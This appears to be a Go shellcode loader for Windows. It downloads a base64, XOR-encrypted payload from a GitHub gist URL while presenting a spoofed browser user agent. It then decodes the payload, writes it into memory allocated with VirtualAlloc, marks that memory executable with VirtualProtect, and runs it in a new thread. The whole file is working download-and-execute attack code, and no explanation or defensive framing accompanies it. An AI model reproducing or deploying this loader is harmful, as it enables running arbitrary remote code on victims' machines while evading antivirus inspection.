package main

import (
  "encoding/base64"
  "syscall"
  "unsafe"
  "io/ioutil"
  "net/http"
  "fmt"
)

const (
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READ = 0x20
        PAGE_READWRITE = 0x04
)

func EncryptXOR(plaintext, key []byte) []byte {
  ciphertext := make([]byte, len(plaintext))
  for i := 0; i < len(plaintext); i++ {
    ciphertext[i] = plaintext[i] ^ key[i % len(key)]
  }

  return ciphertext
}

func main() {
        url := "https://gist.githubusercontent.com/m1kemu/ad1a7b87fb1b82e45ec63d63964d9473/raw/c4aaafe195ef7dc969edf0f53f34f4572bfc0e79/download_me_go.txt"
        user_agent := "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"

        key := "0123456789123456"
        randomizer := "0194859201785729"
        fmt.Println("[+] Randomizer: ", randomizer)

        req, _ := http.NewRequest("GET", url, nil)
        req.Header.Set("User-Agent", user_agent)
        client := &http.Client{}
        resp, _ := client.Do(req)

        defer resp.Body.Close()

        content, _ := ioutil.ReadAll(resp.Body)
        ciphertext_b64 := content

        ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
        plaintext := EncryptXOR(ciphertext, []byte(key))

        sc := plaintext

        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        ntdll := syscall.NewLazyDLL("ntdll.dll")

        VirtualAlloc := kernel32.NewProc("VirtualAlloc")
        VirtualProtect := kernel32.NewProc("VirtualProtect")
        RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
        CreateThread := kernel32.NewProc("CreateThread")
        WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

        addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

        RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

        oldProtect := PAGE_READWRITE
        VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

        thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

        WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
